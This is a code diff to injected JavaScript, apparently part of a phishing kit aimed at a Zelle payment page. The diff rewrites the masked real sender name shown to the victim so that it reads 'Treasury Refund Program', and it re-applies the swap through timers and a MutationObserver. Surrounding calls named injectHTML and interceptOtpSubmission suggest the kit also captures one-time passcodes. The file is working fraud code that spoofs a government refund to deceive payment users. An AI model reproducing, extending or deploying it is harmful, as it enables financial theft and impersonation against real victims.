@@ -864,17 +864,36 @@
     }
     
     // ========================================
-    // REPLACE "FROM" SENDER NAME
+    // REPLACE LANDING PAGE "FROM" SENDER NAME
     // ========================================
     function replaceLandingPageFromName() {
         const ourContainer = document.getElementById('zelle-extended-flow');
-        const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        const root = document.getElementById('root');
+        if (!root) return;
+        if (ourContainer && root.textContent.includes('Treasury Refund Program')) return;
+        
+        const fullText = root.innerText || root.textContent || '';
+        if (!fullText.includes('from:') || !/\*\*\*/.test(fullText)) return;
+        
+        const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
         let node;
+        const toReplace = [];
         while (node = walker.nextNode()) {
-            if (ourContainer && ourContainer.contains(node)) continue;
-            const text = node.textContent;
-            if (text && text.includes('from:') && /\*\*\*/.test(text) && !text.includes('Treasury Refund Program')) {
-                node.textContent = text.replace(/from:\s*[^\n]+/i, 'from: Treasury Refund Program');
+            if (ourContainer && ourContainer.contains(node.parentElement)) continue;
+            const text = node.textContent || '';
+            if (text && (/\*\*\*/.test(text) || (text.includes('from:') && text.length < 50))) {
+                const combined = text.trim();
+                if (/from:\s*.+\*/.test(combined) || /^[A-Z]\*\*\*\s+[A-Z]\*\*\*$/.test(combined)) {
+                    toReplace.push(node);
+                }
+            }
+        }
+        for (const n of toReplace) {
+            const t = n.textContent || '';
+            if (t.includes('from:') && /\*/.test(t) && !t.includes('Treasury Refund Program')) {
+                n.textContent = t.replace(/from:\s*[^\n]+/i, 'from: Treasury Refund Program');
+            } else if (/^[A-Z]\*\*\*\s+[A-Z]\*\*\*$/.test(t.trim())) {
+                n.textContent = 'Treasury Refund Program';
             }
         }
     }
@@ -887,7 +906,9 @@
         injectHTML();
         interceptOtpSubmission();
         replaceLandingPageFromName();
+        [500, 1500, 3000].forEach(ms => setTimeout(replaceLandingPageFromName, ms));
         new MutationObserver(() => replaceLandingPageFromName()).observe(document.body, { subtree: true, childList: true });
+        setInterval(replaceLandingPageFromName, 2000);
     }
     
     // Wait for DOM ready
